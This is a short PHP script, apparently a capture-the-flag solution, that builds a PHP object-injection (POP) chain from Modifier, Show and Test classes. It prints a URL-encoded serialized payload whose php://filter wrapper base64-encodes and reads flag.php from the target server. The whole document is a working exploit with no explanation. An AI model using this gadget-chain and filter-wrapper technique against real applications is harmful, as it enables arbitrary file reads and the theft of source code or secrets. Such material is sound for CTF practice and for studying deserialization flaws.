<?php
class Modifier {
    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php' ;

}

class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
    }
    public function __toString(){
        return "karsa";
    }
}

class Test{
    public $p;
}

$a = new Show('aaa');
$a->str = new Test();
$a->str->p = new Modifier();
$b = new Show($a);
echo urlencode(serialize($b));